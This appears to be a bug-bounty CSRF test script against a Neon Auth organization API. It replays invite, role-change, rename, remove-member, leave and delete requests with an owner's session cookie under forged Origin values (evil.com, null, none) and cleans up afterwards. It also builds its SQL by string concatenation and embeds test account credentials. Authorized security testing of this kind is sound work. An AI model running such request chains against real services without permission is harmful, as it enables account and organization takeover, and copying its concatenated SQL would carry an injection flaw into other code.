# -*- coding: utf-8 -*-
"""V13: org plugin endpoints x Origin CSRF matrix. NEVER tested with evil/no Origin.
If write endpoints lack Origin check -> CSRF chain (invite/role-update/remove/delete)
using victim session cookie. Cookie SameSite=None -> sent cross-site unless CHIPS.
Matrix: each op x {localhost(ctrl), evil.com, null, NO-Origin} with U1(owner) cookie."""
import json, ssl, time, http.client

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
PA = "orange-sun-90493739"
PAMAIN = "br-wandering-field-w2ob6mpn"
with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]
ctx = ssl.create_default_context()
DB_URI = None
PASS = "SecTest!2026pass"
U1 = "libobo1229+na_org1@gmail.com"
U2 = "libobo1229+na_org2@gmail.com"
ONCE = "libobo1229+v13one@gmail.com"


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def na(method, path, body=None, cookie=None, origin="http://localhost:3000", timeout=30):
    try:
        conn = http.client.HTTPSConnection(NA_HOST, timeout=timeout, context=ctx)
        payload = json.dumps(body) if body is not None else None
        hdrs = {"Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0", "Accept": "application/json",
                "X-Bug-Bounty": "xxbo"}
        if origin is not None:
            hdrs["Origin"] = origin
        if cookie:
            hdrs["Cookie"] = cookie
        conn.request(method, path, body=payload, headers=hdrs)
        resp = conn.getresponse()
        data = resp.read().decode("utf-8", "replace")
        ck = resp.getheader("Set-Cookie", "")
        conn.close()
        time.sleep(0.4)
        return resp.status, data, ck
    except Exception as e:
        time.sleep(0.4)
        return None, str(e)[:150], ""


def auth(email):
    st, data, ck = na("POST", "/neondb/auth/sign-in/email",
                      {"email": email, "password": PASS})
    return ck.split(";")[0] if st in (200, 201) else None


def fetch_db_uri():
    global DB_URI
    conn = http.client.HTTPSConnection(API_HOST, timeout=30, context=ctx)
    conn.request("GET", API_BASE + "/projects/%s/connection_uri?database_name=neondb"
                 "&role_name=neondb_owner&branch_id=%s" % (PA, PAMAIN),
                 headers={"X-Bug-Bounty": "xxbo", "Authorization": "Bearer " + APIKEY})
    resp = conn.getresponse()
    data = json.loads(resp.read().decode("utf-8", "replace"))
    conn.close()
    uri = data.get("uri")
    from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
    parts = urlsplit(uri)
    q = [(k, v) for k, v in parse_qsl(parts.query) if k != "channel_binding"]
    DB_URI = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))


def dbq(sql):
    import psycopg
    with psycopg.connect(DB_URI, connect_timeout=15) as conn:
        conn.autocommit = True
        with conn.cursor() as cur:
            cur.execute(sql)
            if cur.description is None:
                return None
            return cur.fetchall()


def main():
    out("== V13 org endpoints x Origin CSRF matrix ==")
    fetch_db_uri()
    c1, c2 = auth(U1), auth(U2)
    out("sessions: %s" % [bool(c1), bool(c2)])
    if not (c1 and c2):
        return
    # org create first with ctrl origin
    st, d, _ = na("POST", "/neondb/auth/organization/create",
                  {"name": "v13-org", "slug": "v13-%d" % int(time.time())}, c1)
    org = json.loads(d).get("id") if st == 200 else None
    out("org=%s" % org)
    if not org:
        return
    # U2 member (ctrl)
    st, d, _ = na("POST", "/neondb/auth/organization/invite-member",
                  {"organizationId": org, "email": U2, "role": "member"}, c1)
    r = dbq('SELECT id FROM neon_auth.invitation WHERE "organizationId"=%s AND email=%s '
            'AND status=%s' % ("'" + org + "'", "'" + U2 + "'", "'pending'"))
    iid = str(r[0][0]) if r else None
    if iid:
        st, d, _ = na("POST", "/neondb/auth/organization/accept-invitation",
                      {"invitationId": iid}, c2)
        out("U2 joined -> %d" % st)
    r = dbq('SELECT id, "userId" FROM neon_auth.member WHERE "organizationId"=%s AND '
            '"userId"=(SELECT id FROM neon_auth.user WHERE email=%s)'
            % ("'" + org + "'", "'" + U2 + "'"))
    m2 = str(r[0][0]) if r else None

    origins = [("ctrl-local", "http://localhost:3000"),
               ("evil.com", "https://evil.com"),
               ("null", "null"),
               ("NO-Origin", None)]
    for tag, ov in origins:
        st, d, _ = na("POST", "/neondb/auth/organization/invite-member",
                   {"organizationId": org, "email": ONCE, "role": "member"}, c1, origin=ov)
        out("%-10s invite-member        -> %d %s" % (tag, st, d[:90]))
        # cleanup if created
        if st == 200 and ov != "http://localhost:3000":
            rr = dbq('SELECT id FROM neon_auth.invitation WHERE "organizationId"=%s AND email=%s '
                     'AND status=%s' % ("'" + org + "'", "'" + ONCE + "'", "'pending'"))
            if rr:
                dbq('DELETE FROM neon_auth.invitation WHERE id=%s' % ("'" + str(rr[0][0]) + "'"))
                out("        cleaned pending invite")

    if m2:
        for tag, ov in origins:
            st, d, _ = na("POST", "/neondb/auth/organization/update-member-role",
                       {"organizationId": org, "memberId": m2, "role": "admin"}, c1, origin=ov)
            out("%-10s update-member-role -> %d %s" % (tag, st, d[:90]))
            if st == 200:
                # revert to member if changed
                na("POST", "/neondb/auth/organization/update-member-role",
                   {"organizationId": org, "memberId": m2, "role": "member"}, c1)
        for tag, ov in origins:
            st, d, _ = na("POST", "/neondb/auth/organization/update",
                       {"organizationId": org, "data": {"name": "v13-renamed"}}, c1, origin=ov)
            out("%-10s update-org         -> %d %s" % (tag, st, d[:90]))
            if st == 200:
                na("POST", "/neondb/auth/organization/update",
                   {"organizationId": org, "data": {"name": "v13-org"}}, c1)
        for tag, ov in origins:
            st, d, _ = na("POST", "/neondb/auth/organization/remove-member",
                       {"organizationId": org, "memberIdOrEmail": m2}, c1, origin=ov)
            out("%-10s remove-member      -> %d %s" % (tag, st, d[:90]))
            if st == 200 and ov != "http://localhost:3000":
                out("        !! removed without origin - re-adding")
                na("POST", "/neondb/auth/organization/invite-member",
                   {"organizationId": org, "email": U2, "role": "member"}, c1)
                r2 = dbq('SELECT id FROM neon_auth.invitation WHERE "organizationId"=%s AND email=%s '
                         'AND status=%s' % ("'" + org + "'", "'" + U2 + "'", "'pending'"))
                i2 = str(r2[0][0]) if r2 else None
                if i2:
                    na("POST", "/neondb/auth/organization/accept-invitation",
                       {"invitationId": i2}, c2)
    # leave with no-origin (destructive-ish; U2 only)
    st, d, _ = na("POST", "/neondb/auth/organization/leave",
               {"organizationId": org}, c2, origin=None)
    out("NO-Origin leave (U2 member)  -> %d %s" % (st, d[:90]))
    # delete org with NO-Origin (if passes -> org deleted, cleanup done)
    st, d, _ = na("POST", "/neondb/auth/organization/delete",
               {"organizationId": org}, c1, origin=None)
    out("NO-Origin delete-org         -> %d %s" % (st, d[:90]))
    if st != 200:
        na("POST", "/neondb/auth/organization/delete", {"organizationId": org}, c1)
        out("cleanup ctrl delete")
    dbq('DELETE FROM neon_auth.invitation WHERE "organizationId"=%s' % ("'" + org + "'"))
    out("done")


if __name__ == "__main__":
    main()
